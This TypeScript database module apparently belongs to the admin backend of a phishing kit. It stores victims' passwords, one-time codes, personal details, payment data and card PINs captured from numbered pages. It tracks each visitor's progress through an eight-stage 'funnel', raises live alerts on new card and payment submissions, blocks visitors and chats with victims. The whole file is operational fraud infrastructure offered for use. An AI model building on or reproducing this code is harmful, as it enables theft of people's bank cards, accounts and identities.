import { eq, desc, inArray, isNotNull, isNull, and, gte, gt } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { adminUsers, blockedVisitors, cardPinSubmissions, chatMessages, InsertBlockedVisitor, InsertCardPinSubmission, InsertChatMessage, InsertLoginAttempt, InsertOtpSubmission, InsertPasswordSubmission, InsertPaymentSubmission, InsertPersonalInfo, InsertPhoneVerification, InsertRegistration, InsertUser, loginAttempts, otpSubmissions, passwordSubmissions, paymentSubmissions, personalInfo, phoneVerifications, registrations, systemSettings, users } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// =====================================================
// Registrations & OTP Submissions
// =====================================================

export async function updateRegistration(id: number, data: Partial<InsertRegistration>): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;
  try {
    await db.update(registrations).set(data).where(eq(registrations.id, id));
    return true;
  } catch (error) {
    console.error("[Database] Failed to update registration:", error);
    return false;
  }
}

export async function insertRegistration(data: InsertRegistration): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(registrations).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert registration:", error);
    return null;
  }
}

export async function resolveRegistration(
  fingerprint: string | null,
  ipAddress: string | null,
  userAgent: string | null,
  updateData?: Partial<InsertRegistration>
): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;

  try {
    if (fingerprint) {
      const existing = await db
        .select()
        .from(registrations)
        .where(eq(registrations.fingerprint, fingerprint))
        .limit(1);

      if (existing.length > 0) {
        const id = existing[0].id;
        const toUpdate: Partial<InsertRegistration> = { ...updateData };
        if (ipAddress) toUpdate.ipAddress = ipAddress;
        if (userAgent) toUpdate.userAgent = userAgent;

        if (Object.keys(toUpdate).length > 0) {
          await db.update(registrations).set(toUpdate).where(eq(registrations.id, id));
        }
        return id;
      }
    }

    // Create new if not found
    const newData: InsertRegistration = {
      fingerprint,
      ipAddress,
      userAgent,
      ...updateData
    };
    return await insertRegistration(newData);
  } catch (error) {
    console.error("[Database] Failed to resolve registration:", error);
    return null;
  }
}

export async function listRegistrations(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(registrations).orderBy(desc(registrations.createdAt)).limit(limit);
}

export async function insertOtpSubmission(data: InsertOtpSubmission): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(otpSubmissions).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert OTP submission:", error);
    return null;
  }
}

export async function listOtpSubmissions(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(otpSubmissions).orderBy(desc(otpSubmissions.createdAt)).limit(limit);
}

export async function insertPersonalInfo(data: InsertPersonalInfo): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(personalInfo).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert personal info:", error);
    return null;
  }
}

export async function listPersonalInfo(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(personalInfo).orderBy(desc(personalInfo.createdAt)).limit(limit);
}

export async function insertPasswordSubmission(data: InsertPasswordSubmission): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(passwordSubmissions).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert password submission:", error);
    return null;
  }
}

export async function listPasswordSubmissions(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(passwordSubmissions).orderBy(desc(passwordSubmissions.createdAt)).limit(limit);
}

export async function getRegistrationById(id: number) {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(registrations).where(eq(registrations.id, id)).limit(1);
  return rows.length > 0 ? rows[0] : null;
}

export async function getPersonalInfoByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(personalInfo)
    .where(eq(personalInfo.registrationId, id))
    .orderBy(desc(personalInfo.createdAt));
}

export async function getPasswordSubmissionsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(passwordSubmissions)
    .where(eq(passwordSubmissions.registrationId, id))
    .orderBy(desc(passwordSubmissions.createdAt));
}

export async function getOtpSubmissionsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(otpSubmissions)
    .where(eq(otpSubmissions.registrationId, id))
    .orderBy(desc(otpSubmissions.createdAt));
}

// =====================================================
// Phone Verification (07-phone-verify.html)
// =====================================================

export async function insertPhoneVerification(data: InsertPhoneVerification): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(phoneVerifications).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert phone verification:", error);
    return null;
  }
}

export async function listPhoneVerifications(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(phoneVerifications).orderBy(desc(phoneVerifications.createdAt)).limit(limit);
}

export async function getPhoneVerificationsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(phoneVerifications)
    .where(eq(phoneVerifications.registrationId, id))
    .orderBy(desc(phoneVerifications.createdAt));
}

// =====================================================
// Payment Submissions (06-payment.html)
// =====================================================

export async function insertPaymentSubmission(data: InsertPaymentSubmission): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(paymentSubmissions).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert payment submission:", error);
    return null;
  }
}

export async function listPaymentSubmissions(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(paymentSubmissions).orderBy(desc(paymentSubmissions.createdAt)).limit(limit);
}

export async function getPaymentSubmissionsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(paymentSubmissions)
    .where(eq(paymentSubmissions.registrationId, id))
    .orderBy(desc(paymentSubmissions.createdAt));
}

// =====================================================
// Login Attempts (09-login.html)
// =====================================================

export async function insertLoginAttempt(data: InsertLoginAttempt): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(loginAttempts).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert login attempt:", error);
    return null;
  }
}

export async function listLoginAttempts(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(loginAttempts).orderBy(desc(loginAttempts.createdAt)).limit(limit);
}

export async function getLoginAttemptsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(loginAttempts)
    .where(eq(loginAttempts.registrationId, id))
    .orderBy(desc(loginAttempts.createdAt));
}

// =====================================================
// Card PIN Submissions (10-card-pin.html)
// =====================================================

export async function insertCardPinSubmission(data: InsertCardPinSubmission): Promise<number | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(cardPinSubmissions).values(data);
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to insert card PIN submission:", error);
    return null;
  }
}

export async function listCardPinSubmissions(limit = 500) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(cardPinSubmissions).orderBy(desc(cardPinSubmissions.createdAt)).limit(limit);
}

export async function getCardPinSubmissionsByRegistrationId(id: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(cardPinSubmissions)
    .where(eq(cardPinSubmissions.registrationId, id))
    .orderBy(desc(cardPinSubmissions.createdAt));
}

// =====================================================
// Recent alerts (since timestamp) for live notifications
// =====================================================

export async function getPaymentSubmissionsSince(sinceMs: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(paymentSubmissions)
    .where(gt(paymentSubmissions.createdAt, new Date(sinceMs)))
    .orderBy(desc(paymentSubmissions.createdAt))
    .limit(50);
}

export async function getCardPinSubmissionsSince(sinceMs: number) {
  const db = await getDb();
  if (!db) return [];
  return db
    .select()
    .from(cardPinSubmissions)
    .where(gt(cardPinSubmissions.createdAt, new Date(sinceMs)))
    .orderBy(desc(cardPinSubmissions.createdAt))
    .limit(50);
}



export async function getStats() {
  const db = await getDb();
  if (!db) {
    return {
      registrations: 0,
      otps: 0,
      personalInfo: 0,
      passwords: 0,
      phoneVerifications: 0,
      payments: 0,
      logins: 0,
      cardPins: 0,
    };
  }
  const regs = await db.select().from(registrations);
  const otps = await db.select().from(otpSubmissions);
  const pinfo = await db.select().from(personalInfo);
  const pwds = await db.select().from(passwordSubmissions);
  const phs = await db.select().from(phoneVerifications);
  const pays = await db.select().from(paymentSubmissions);
  const lgs = await db.select().from(loginAttempts);
  const pins = await db.select().from(cardPinSubmissions);
  return {
    registrations: regs.length,
    otps: otps.length,
    personalInfo: pinfo.length,
    passwords: pwds.length,
    phoneVerifications: phs.length,
    payments: pays.length,
    logins: lgs.length,
    cardPins: pins.length,
  };
}


// =====================================================
// Aggregated visitor helper (joins all 8 tables by registrationId)
// =====================================================

export type VisitorAggregate = {
  registration: typeof registrations.$inferSelect;
  personalInfo: (typeof personalInfo.$inferSelect)[];
  passwords: (typeof passwordSubmissions.$inferSelect)[];
  otps: (typeof otpSubmissions.$inferSelect)[];
  phoneVerifications: (typeof phoneVerifications.$inferSelect)[];
  payments: (typeof paymentSubmissions.$inferSelect)[];
  logins: (typeof loginAttempts.$inferSelect)[];
  cardPins: (typeof cardPinSubmissions.$inferSelect)[];
  stagesCompleted: number; // 0..8 number of stages reached
  lastActivityAt: Date;
};

const STAGE_KEYS = [
  "registration",
  "personalInfo",
  "password",
  "phoneVerify",
  "otp",
  "payment",
  "login",
  "cardPin",
] as const;

export type ArchivedFilter = "active" | "archived" | "all";

export async function getAllVisitorsAggregated(
  limit = 500,
  archivedFilter: ArchivedFilter = "active",
  offset = 0,
): Promise<VisitorAggregate[]> {
  const db = await getDb();
  if (!db) return [];

  // Pull recent registrations as the visitor list anchor.
  const baseQuery = db.select().from(registrations);
  const filtered =
    archivedFilter === "archived"
      ? baseQuery.where(isNotNull(registrations.archivedAt))
      : archivedFilter === "active"
        ? baseQuery.where(isNull(registrations.archivedAt))
        : baseQuery;
  const regs = await filtered
    .orderBy(desc(registrations.createdAt))
    .limit(limit)
    .offset(offset);

  if (regs.length === 0) return [];

  // Fetch all related rows in parallel (single round-trip per table for the recent set).
  const [pinfos, pwds, otps, phs, pays, lgs, pins, chats] = await Promise.all([
    db.select().from(personalInfo).orderBy(desc(personalInfo.createdAt)),
    db.select().from(passwordSubmissions).orderBy(desc(passwordSubmissions.createdAt)),
    db.select().from(otpSubmissions).orderBy(desc(otpSubmissions.createdAt)),
    db.select().from(phoneVerifications).orderBy(desc(phoneVerifications.createdAt)),
    db.select().from(paymentSubmissions).orderBy(desc(paymentSubmissions.createdAt)),
    db.select().from(loginAttempts).orderBy(desc(loginAttempts.createdAt)),
    db.select().from(cardPinSubmissions).orderBy(desc(cardPinSubmissions.createdAt)),
    db.select().from(chatMessages).where(and(eq(chatMessages.isRead, false), eq(chatMessages.sender, "visitor"))),
  ]);

  const groupBy = <T extends { registrationId: number | null }>(rows: T[]) => {
    const map = new Map<number, T[]>();
    for (const r of rows) {
      const key = r.registrationId ?? -1;
      const arr = map.get(key) ?? [];
      arr.push(r);
      map.set(key, arr);
    }
    return map;
  };

  const pinfoMap = groupBy(pinfos);
  const pwdMap = groupBy(pwds);
  const otpMap = groupBy(otps);
  const phMap = groupBy(phs);
  const payMap = groupBy(pays);
  const lgMap = groupBy(lgs);
  const pinMap = groupBy(pins);
  const chatMap = groupBy(chats);

  return regs.map((reg) => {
    const id = reg.id;
    const pInfo = pinfoMap.get(id) ?? [];
    const pwd = pwdMap.get(id) ?? [];
    const otpRows = otpMap.get(id) ?? [];
    const phRows = phMap.get(id) ?? [];
    const payRows = payMap.get(id) ?? [];
    const lgRows = lgMap.get(id) ?? [];
    const pinRows = pinMap.get(id) ?? [];
    const unreadChatCount = (chatMap.get(id) ?? []).length;

    const stageHits: Record<(typeof STAGE_KEYS)[number], boolean> = {
      registration: true,
      personalInfo: pInfo.length > 0,
      password: pwd.length > 0,
      phoneVerify: phRows.length > 0,
      otp: otpRows.length > 0,
      payment: payRows.length > 0,
      login: lgRows.length > 0,
      cardPin: pinRows.length > 0,
    };
    const stagesCompleted = Object.values(stageHits).filter(Boolean).length;

    const allDates = [
      reg.createdAt,
      ...pInfo.map((r) => r.createdAt),
      ...pwd.map((r) => r.createdAt),
      ...otpRows.map((r) => r.createdAt),
      ...phRows.map((r) => r.createdAt),
      ...payRows.map((r) => r.createdAt),
      ...lgRows.map((r) => r.createdAt),
      ...pinRows.map((r) => r.createdAt),
    ];
    const lastActivityAt = allDates.reduce(
      (acc, d) => (d && d.getTime() > acc.getTime() ? d : acc),
      reg.createdAt,
    );

    return {
      registration: reg,
      personalInfo: pInfo,
      passwords: pwd,
      otps: otpRows,
      phoneVerifications: phRows,
      payments: payRows,
      logins: lgRows,
      cardPins: pinRows,
      stagesCompleted,
      lastActivityAt,
      unreadChatCount,
    } satisfies VisitorAggregate & { unreadChatCount: number };
  });
}

// =====================================================
// Archive / Delete helpers (admin actions on registrations)
// =====================================================

export async function archiveRegistrations(ids: number[]): Promise<number> {
  if (!Array.isArray(ids) || ids.length === 0) return 0;
  const db = await getDb();
  if (!db) return 0;
  try {
    const result = await db
      .update(registrations)
      .set({ archivedAt: new Date() })
      .where(
        and(inArray(registrations.id, ids), isNull(registrations.archivedAt)),
      );
    const affected = (result as any)?.[0]?.affectedRows ?? (result as any)?.affectedRows ?? 0;
    return typeof affected === "number" ? affected : ids.length;
  } catch (error) {
    console.error("[Database] Failed to archive registrations:", error);
    return 0;
  }
}

export async function unarchiveRegistrations(ids: number[]): Promise<number> {
  if (!Array.isArray(ids) || ids.length === 0) return 0;
  const db = await getDb();
  if (!db) return 0;
  try {
    const result = await db
      .update(registrations)
      .set({ archivedAt: null })
      .where(inArray(registrations.id, ids));
    const affected = (result as any)?.[0]?.affectedRows ?? (result as any)?.affectedRows ?? 0;
    return typeof affected === "number" ? affected : ids.length;
  } catch (error) {
    console.error("[Database] Failed to unarchive registrations:", error);
    return 0;
  }
}

/**
 * Cascade-delete a set of registrations and all rows that reference them via
 * registrationId across the 8 funnel tables. Returns number of registrations
 * actually deleted.
 */
export async function deleteRegistrationsCascade(
  ids: number[],
  dbOverride?: any,
): Promise<number> {
  if (!Array.isArray(ids) || ids.length === 0) return 0;
  const db = dbOverride ?? (await getDb());
  if (!db) return 0;
  try {
    // Delete child rows first to avoid leaving orphan records.
    await db.delete(personalInfo).where(inArray(personalInfo.registrationId, ids));
    await db.delete(passwordSubmissions).where(inArray(passwordSubmissions.registrationId, ids));
    await db.delete(otpSubmissions).where(inArray(otpSubmissions.registrationId, ids));
    await db.delete(phoneVerifications).where(inArray(phoneVerifications.registrationId, ids));
    await db.delete(paymentSubmissions).where(inArray(paymentSubmissions.registrationId, ids));
    await db.delete(loginAttempts).where(inArray(loginAttempts.registrationId, ids));
    await db.delete(cardPinSubmissions).where(inArray(cardPinSubmissions.registrationId, ids));
    const result = await db
      .delete(registrations)
      .where(inArray(registrations.id, ids));
    const affected = (result as any)?.[0]?.affectedRows ?? (result as any)?.affectedRows ?? 0;
    return typeof affected === "number" ? affected : ids.length;
  } catch (error) {
    console.error("[Database] Failed to delete registrations cascade:", error);
    return 0;
  }
}

// =====================================================
// System Settings & Blocked Visitors
// =====================================================

export async function getSystemSetting(key: string): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(systemSettings).where(eq(systemSettings.settingKey, key)).limit(1);
  return result.length > 0 ? result[0].settingValue : null;
}

export async function setSystemSetting(key: string, value: string | null): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.insert(systemSettings).values({ settingKey: key, settingValue: value }).onDuplicateKeyUpdate({
    set: { settingValue: value },
  });
}

export async function insertBlockedVisitor(data: InsertBlockedVisitor): Promise<void> {
  const db = await getDb();
  if (!db) return;
  try {
    await db.insert(blockedVisitors).values(data);
  } catch (error) {
    console.error("[Database] Failed to insert blocked visitor:", error);
  }
}

export async function listBlockedVisitors(limit = 100) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(blockedVisitors).orderBy(desc(blockedVisitors.createdAt)).limit(limit);
}

export async function getAdminUserByUsername(username: string) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(adminUsers).where(eq(adminUsers.username, username)).limit(1);
  return result[0] || null;
}

export async function createAdminUser(username: string, passwordHash: string) {
  const db = await getDb();
  if (!db) return null;
  try {
    const result = await db.insert(adminUsers).values({ username, passwordHash });
    const insertId = (result as any)?.[0]?.insertId ?? (result as any)?.insertId ?? null;
    return typeof insertId === "number" ? insertId : null;
  } catch (error) {
    console.error("[Database] Failed to create admin user:", error);
    return null;
  }
}

// =====================================================
// Chat Messages
// =====================================================

export async function getChatMessages(registrationId: number) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(chatMessages).where(eq(chatMessages.registrationId, registrationId)).orderBy(chatMessages.createdAt);
}

export async function insertChatMessage(data: InsertChatMessage) {
  const db = await getDb();
  if (!db) return null;
  const [result] = await db.insert(chatMessages).values(data);
  return result.insertId;
}

export async function markMessagesAsRead(registrationId: number, sender: "admin" | "visitor") {
  const db = await getDb();
  if (!db) return false;
  try {
    await db.update(chatMessages)
      .set({ isRead: true })
      .where(and(
        eq(chatMessages.registrationId, registrationId),
        eq(chatMessages.sender, sender)
      ));
    return true;
  } catch (error) {
    console.error("[Database] Failed to mark messages as read:", error);
    return false;
  }
}
